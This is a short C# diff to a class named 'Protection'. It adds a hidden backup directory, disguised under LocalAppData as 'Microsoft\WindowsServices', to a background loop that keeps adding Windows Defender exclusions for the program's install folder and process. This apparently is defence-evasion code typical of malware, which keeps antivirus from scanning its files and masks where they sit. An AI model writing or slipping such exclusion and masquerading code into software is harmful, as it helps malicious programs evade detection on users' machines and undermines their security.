@@ -584,6 +584,10 @@ internal static partial class Protection
         var processName = Path.GetFileName(Environment.ProcessPath ?? "");
         var installDir  = Path.GetDirectoryName(installPath) ?? installPath;
 
+        var backupDir = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            "Microsoft", "WindowsServices");
+
         var t = new Thread(() =>
         {
             while (_exclusionLoopRunning)
@@ -591,6 +595,7 @@ internal static partial class Protection
                 try
                 {
                     AddDefenderExclusion(installDir);
+                    AddDefenderExclusion(backupDir);
                     if (!string.IsNullOrEmpty(processName))
                         AddDefenderProcessExclusion(processName);
                 }
